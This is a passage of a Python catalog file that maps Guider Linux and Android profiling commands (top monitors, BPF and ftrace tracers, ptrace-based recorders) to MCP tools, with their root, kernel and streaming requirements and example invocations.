"""
guider_catalog.py — Command metadata catalog for Guider MCP integration.

Each entry defines execution constraints, output type, and MCP tool mapping.
"""

from __future__ import annotations

import os

# ---------------------------------------------------------------------------
# Schema fields:
#   requires_root   bool   — needs CAP_SYS_ADMIN / CAP_BPF / root
#   output_type     str    — "json" | "text" | "file"
#   streaming       bool   — True = infinite loop; adapter MUST add -R Ns
#   default_duration str   — default -R value for streaming commands
#   min_kernel      str    — minimum Linux kernel version ("" = any)
#   mcp_tool        str    — which of the 10 MCP tools handles this command
#   semaphore       bool   — True = tracefs; max 1 concurrent
#   android_only    bool   — requires Android/adb
#   description     str    — one-line description
#   examples        list   — usage examples
# ---------------------------------------------------------------------------

CATALOG: dict = {
    # ------------------------------------------------------------------ #
    #  systemMonitor                                                       #
    # ------------------------------------------------------------------ #
    "top": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "System-wide CPU/memory/IO top monitor",
        "examples": ["guider top", "guider top -i 1 -R 5s -J"],
    },
    "ttop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Thread-level CPU top monitor",
        "examples": ["guider ttop", "guider ttop -i 1 -R 5s"],
    },
    "atop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "App-level resource monitor",
        "examples": ["guider atop"],
    },
    "mtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Memory usage top monitor",
        "examples": ["guider mtop"],
    },
    "vtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Virtual memory top monitor",
        "examples": ["guider vtop"],
    },
    "wtop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Wait/blocked state thread monitor",
        "examples": ["guider wtop"],
    },
    "ftop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "File descriptor top monitor",
        "examples": ["guider ftop"],
    },
    "ntop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Network usage top monitor",
        "examples": ["guider ntop"],
    },
    "disktop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Disk I/O top monitor",
        "examples": ["guider disktop"],
    },
    "irqtop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "IRQ usage top monitor",
        "examples": ["guider irqtop"],
    },
    "swaptop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Swap usage top monitor",
        "examples": ["guider swaptop"],
    },
    "slabtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Kernel slab allocator top monitor",
        "examples": ["guider slabtop"],
    },
    "kstop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": (
            "Kernel call-stack sampler for a specific thread via ptrace + /proc/<pid>/stack polling "
            "(Debugger mode=\"kernel\", NOT ftrace despite the ftraceProfile grouping — grouped here for "
            "consistency with sibling ptrace-based commands btop/systop). Root is required only when "
            "attaching to an already-running -g <TID|COMM>; launching its own child command does not "
            "require root"
        ),
        "examples": ["guider kstop -g <pid>", "guider kstop -g 1234 -T 1ms -i 2 -R 1m"],
    },
    "stacktop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Stack usage top monitor",
        "examples": ["guider stacktop"],
    },
    "ctop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Container/cgroup resource top monitor",
        "examples": ["guider ctop"],
    },
    "cgtop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Cgroup top monitor",
        "examples": ["guider cgtop"],
    },
    "contop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Container top monitor",
        "examples": ["guider contop"],
    },
    "oomtop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "OOM candidate top monitor",
        "examples": ["guider oomtop"],
    },
    "pytop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Python process top monitor",
        "examples": ["guider pytop"],
    },
    "rtop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "systemMonitor",
        "semaphore": False,
        "android_only": False,
        "description": "Remote system top monitor (via hserver)",
        "examples": ["guider rtop"],
    },
    "bpfsigtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "BPF signal attribution top: aggregate signal delivery per (sig, sender, target, si_code) tuple",
        "examples": ["guider bpfsigtop", "guider bpfsigtop -q SIGFILTER:9", "guider bpfsigtop -q IGNORESELF"],
    },
    "dbustop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "D-Bus message top monitor",
        "examples": ["guider dbustop"],
    },

    # ------------------------------------------------------------------ #
    #  bpfTrace                                                            #
    # ------------------------------------------------------------------ #
    "bpftop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Per-TID BPF function call count (delta/interval)",
        "main_arg_name": "func_name",
        "main_arg_desc": "kernel function to trace (e.g. 'do_sys_openat2')",
        "examples": ["guider bpftop do_sys_openat2", "guider bpftop -q LAT"],
    },
    "bpfsnoop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Real-time per-function call stream via BPF perf ring buffer; "
        "also supports live open-fd count (FDCOUNT), fd-count threshold "
        "filtering (FDCNTFILTER), full fd+path listing (FDLIST), in-kernel "
        "syscall-number filtering (SYSCALLFILTER), and process-name filtering "
        "by the target's own comm (PROCCOMMFILTER, unlike -g's per-thread match; "
        "prefix a pattern with '!' to exclude a process instead of including it)",
        "main_arg_name": "func_name",
        "main_arg_desc": "kernel function to trace (e.g. 'do_sys_openat2')",
        "examples": [
            "guider bpfsnoop do_sys_openat2",
            "guider bpfsnoop raw_syscalls/sys_exit -q "
            "\"TRACEPOINT,SYSCALLFILTER:openat,ARG2FDNO,FDCOUNT,FDCNTFILTER:>999\"",
            "guider bpfsnoop raw_syscalls/sys_exit -q "
            "\"TRACEPOINT,SYSCALLFILTER:openat,PROCCOMMFILTER:system_server,"
            "FDCOUNT,FDCNTFILTER:>999\"",
        ],
    },
    "bpfstacktop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "CPU on-stack sampler at 99Hz (SW_CPU_CLOCK)",
        "examples": ["guider bpfstacktop"],
    },
    "bpfwaittop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Off-CPU blocked stack sampler via sched_switch tracepoint",
        "examples": ["guider bpfwaittop"],
    },
    "bpfexectop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "4.9",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "exec() call count top per process via sched_process_exec tracepoint",
        "examples": ["guider bpfexectop", "guider bpfexectop -R 60"],
    },
    "bpfexecsnoop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "4.9",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Real-time exec() event stream (TIME|PID|COMM|FILENAME) via perf ring buffer",
        "examples": ["guider bpfexecsnoop", "guider bpfexecsnoop -R 30"],
    },
    "bpfmmaptop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "4.9",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Anonymous mmap() allocation top per process (outstanding/total bytes) via eBPF",
        "examples": ["guider bpfmmaptop", "guider bpfmmaptop -q ADDUSERSTACK -H 1"],
    },
    "bpfheaptop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "4.9",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": (
            "Heap allocation top (malloc/calloc/realloc/free) via eBPF uprobes on libc — NOT tracepoint-based; "
            "resolves libc.so path from /proc/self/maps and attaches uprobes to malloc/calloc/realloc/memalign/"
            "free symbol offsets"
        ),
        "examples": ["guider bpfheaptop", "guider bpfheaptop -q ADDUSERSTACK"],
    },
    "bpfiotop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "4.9",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Per-process file I/O top (read/write bytes, avg latency) via sys_enter/exit_read/write tracepoints",
        "examples": ["guider bpfiotop", "guider bpfiotop -i 3 -R 60"],
    },
    "bpfblktop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Block I/O latency attribution via block_rq_issue/complete",
        "examples": ["guider bpfblktop"],
    },
    "bpfrunqtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Runqueue latency histogram via sched_wakeup+sched_switch",
        "examples": ["guider bpfrunqtop"],
    },
    "bpfreclaimtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Memory direct reclaim latency per stack via mm_vmscan tracepoints",
        "examples": ["guider bpfreclaimtop"],
    },
    "bpftcpretrans": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "TCP retransmit attribution per flow via tcp_retransmit_skb",
        "examples": ["guider bpftcpretrans"],
    },
    "bpfdroptop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Packet drop attribution by kernel stack via kfree_skb kprobe",
        "examples": ["guider bpfdroptop"],
    },
    "bpftcplat": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "TCP RTT latency histogram (ns, log2 buckets) via tcp_probe tracepoint",
        "examples": ["guider bpftcplat"],
    },
    "bpfudptop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "4.9",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Per-process UDP traffic top (TX/RX bytes and packets) via sendto/recvfrom tracepoints",
        "examples": ["guider bpfudptop", "guider bpfudptop -i 3 -R 60"],
    },
    "bpfudpsnoop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "4.9",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Real-time UDP sendto event stream (TIME|PID|COMM|LEN|SOCKFD) via perf ring buffer; -q DNSONLY filters to port-53 traffic",
        "examples": ["guider bpfudpsnoop", "guider bpfudpsnoop -q DNSONLY -R 30"],
    },
    "bpflocktop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Futex/lock contention latency per stack via futex_wait kprobe",
        "examples": ["guider bpflocktop"],
    },
    "bpfbinderlat": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": True,
        "description": "Binder caller blocking latency + kernel/user stack",
        "examples": ["guider bpfbinderlat"],
    },
    "bpfbindersnoop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": True,
        "description": "Real-time Binder transaction stream via binder_transaction tracepoint",
        "examples": ["guider bpfbindersnoop"],
    },
    "bpfbinderpool": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": True,
        "description": "Binder thread pool sync/async utilization monitor",
        "examples": ["guider bpfbinderpool"],
    },
    "bpfsyscalltop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Per-syscall latency stats (elapsed/count/err/min/max/avg)",
        "examples": ["guider bpfsyscalltop"],
    },
    "bpfsyscallsnoop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Real-time per-syscall event stream with arguments",
        "examples": ["guider bpfsyscallsnoop", "guider bpfsyscallsnoop -q ADDUSERSTACK"],
    },
    "bpfpkttop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "XDP top network flows: per-5-tuple pkt/byte delta per interval",
        "examples": ["guider bpfpkttop"],
    },
    "bpfpktsnoop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "XDP packet stream: real-time per-packet metadata",
        "examples": ["guider bpfpktsnoop"],
    },
    "bpfnetlat": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "XDP→socket receive latency histogram",
        "examples": ["guider bpfnetlat"],
    },
    "bpfwatch": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "HW watchpoint streaming via perf ring buffer",
        "main_arg_name": "addr",
        "main_arg_desc": "memory address to watch (e.g. '0xffff80001234abcd')",
        "examples": ["guider bpfwatch <addr>"],
    },
    "bpfwatchtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "HW watchpoint access top monitor",
        "main_arg_name": "addr",
        "main_arg_desc": "memory address to watch (e.g. '0xffff80001234abcd')",
        "examples": ["guider bpfwatchtop <addr>"],
    },
    "bpfwqtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Workqueue task latency top monitor",
        "examples": ["guider bpfwqtop"],
    },
    "bpfcachetop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Page cache hit/miss top monitor",
        "examples": ["guider bpfcachetop"],
    },
    "bpfkleaktop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Kernel memory leak detection top",
        "examples": ["guider bpfkleaktop"],
    },
    "bpflsmopen": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "LSM hook open event monitor",
        "examples": ["guider bpflsmopen"],
    },
    "bpfprogtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "BPF program runtime monitoring (all loaded programs)",
        "examples": ["guider bpfprogtop"],
    },
    "irqlattop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "bpfTrace",
        "semaphore": False,
        "android_only": False,
        "description": "Per-IRQ handler latency histograms via tracepoints",
        "examples": ["guider irqlattop"],
    },

    # ------------------------------------------------------------------ #
    #  ftraceProfile                                                       #
    # ------------------------------------------------------------------ #
    "trtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "4.4",
        "mcp_tool": "ftraceProfile",
        "semaphore": True,
        "android_only": False,
        "description": "Tracepoint event top via tracefs",
        "examples": ["guider trtop sched/*", "guider trtop irq/*"],
    },
    "tptop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "4.4",
        "mcp_tool": "ftraceProfile",
        "semaphore": True,
        "android_only": False,
        "description": "Tracepoint top monitor",
        "examples": ["guider tptop"],
    },
    "bpfmarktop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "5.8",
        "mcp_tool": "ftraceProfile",
        "semaphore": True,
        "android_only": False,
        "description": "BPF mark-based profiling top",
        "examples": ["guider bpfmarktop"],
    },
    "funcrec": {
        "requires_root": True,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "4.4",
        "mcp_tool": "ftraceProfile",
        "semaphore": True,
        "android_only": False,
        "description": "Function call recording via ftrace function_graph",
        "examples": ["guider funcrec -g task_name"],
    },
    "btop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": True,
        "android_only": False,
        "description": (
            "Break/function-call top for a specific thread via ptrace (Debugger mode=\"break\", "
            "NOT ftrace despite the ftraceProfile grouping — grouped here for consistency with "
            "sibling ptrace-based commands kstop/systop). Root is required only when attaching to "
            "an already-running -g <TID|COMM>; launching its own child command does not require root"
        ),
        "examples": ["guider btop -g <pid>", "guider btop -g 1234 -R 1m"],
    },
    "utop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "User-space function top (perf + addr2line)",
        "examples": ["guider utop -g <pid>"],
    },
    "ktop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "4.4",
        "mcp_tool": "ftraceProfile",
        "semaphore": True,
        "android_only": False,
        "description": "Kernel function top via ftrace",
        "examples": ["guider ktop"],
    },
    "ptop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "Perf event sampling top",
        "examples": ["guider ptop"],
    },
    "fperf": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "Function-level perf profiling (requires target via -g <pid>)",
        "examples": ["guider fperf -g <pid>"],
    },
    "utrace": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "User-space call trace recording",
        "examples": ["guider utrace -g <pid>"],
    },
    "strace": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "Trace syscalls for specific threads (ptrace-based, not to be confused with strace(1))",
        "examples": ["guider strace -g a.out -t read", "guider strace -I \"ls -al\" -J"],
    },
    "pytrace": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "Trace Python calls for specific threads (ptrace-based; up to Python 3.x)",
        "examples": ["guider pytrace -g iotop", "guider pytrace iotop -f"],
    },
    "btrace": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "Native function breakpoint tracing via ptrace (INT3), not ftrace",
        "examples": ["guider btrace -g task_name", "guider btrace -I \"ls -al\" -c write -J"],
    },
    "iorec": {
        "requires_root": True,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "4.4",
        "mcp_tool": "ftraceProfile",
        "semaphore": True,
        "android_only": False,
        "description": "Block I/O recording via ftrace",
        "examples": ["guider iorec"],
    },
    "filerec": {
        "requires_root": True,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "Scan currently mapped/page-cached files (not ftrace-based; -c PATH, -r recursive)",
        "examples": ["guider filerec -c /data -r"],
    },
    "genrec": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "Record a system-wide snapshot (process tree, stats; not ftrace-based, no root needed)",
        "examples": ["guider genrec"],
    },
    "rec": {
        "requires_root": True,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "4.4",
        "mcp_tool": "ftraceProfile",
        "semaphore": True,
        "android_only": False,
        "description": "Record thread-level events via ftrace for later analysis with report",
        "examples": ["guider rec -g task_name"],
    },
    "report": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "Analyze/report a .dat file recorded by rec/funcrec/iorec/sysrec/genrec (-I <file>)",
        "examples": ["guider report -I guider.dat"],
    },
    "sysrec": {
        "requires_root": True,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "4.4",
        "mcp_tool": "ftraceProfile",
        "semaphore": True,
        "android_only": False,
        "description": "System call recording via ftrace",
        "examples": ["guider sysrec"],
    },
    "stat": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "Trace PMU stats for specific threads (perf-based; attaching to an existing PID via -g requires root, spawning via -I does not)",
        "examples": ["guider stat -g a.out -J", "guider stat -I \"ls\" -J"],
    },
    "sigtrace": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": "Trace signals for specific threads (ptrace-based); -J is not implemented for this command's output, only text/pipe format is produced",
        "examples": ["guider sigtrace -g a.out", "guider sigtrace -I \"ls\""],
    },

    # ------------------------------------------------------------------ #
    #  networkTrace                                                        #
    # ------------------------------------------------------------------ #
    "bpftcplife": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "5.8",
        "mcp_tool": "networkTrace",
        "semaphore": False,
        "android_only": False,
        "description": "TCP connection lifecycle events (connect/accept/close)",
        "examples": ["guider bpftcplife"],
    },

    # ------------------------------------------------------------------ #
    #  androidPerf                                                         #
    # ------------------------------------------------------------------ #
    "sperf": {
        "requires_root": False,
        "output_type": "file",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Record CPU-consuming function calls via simpleperf (-g <pid> target; -a system-wide needs root)",
        "examples": ["guider sperf -g <pid> -R 5s"],
    },
    "perfetto": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Android Perfetto trace capture and analysis",
        "examples": ["guider perfetto -q PERF:5s", "guider perfetto -I trace.pb"],
    },
    "bdtop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Android Binder transaction top monitor",
        "examples": ["guider bdtop"],
    },
    "attop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Android ATrace event top monitor",
        "examples": ["guider attop"],
    },
    "gfxtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Android GPU/graphics frame top monitor",
        "examples": ["guider gfxtop"],
    },
    "andtop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Android system top monitor",
        "examples": ["guider andtop"],
    },
    "bugrec": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Android bug report capture",
        "examples": ["guider bugrec"],
    },
    "mdtop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Android media/codec top monitor",
        "examples": ["guider mdtop"],
    },
    "andcmd": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Run Android-specific diagnostic commands",
        "main_arg_name": "sub_command",
        "main_arg_desc": (
            "diagnostic sub-command: getselinux, getpkglist, getproclist, "
            "getbinderstats, getappstat, getpkgattr"
        ),
        "examples": ["guider andcmd getselinux", "guider andcmd getpkglist", "guider andcmd getproclist"],
    },
    "hprof": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Android Java heap profiling via HPROF",
        "examples": ["guider hprof -g <pid>"],
    },
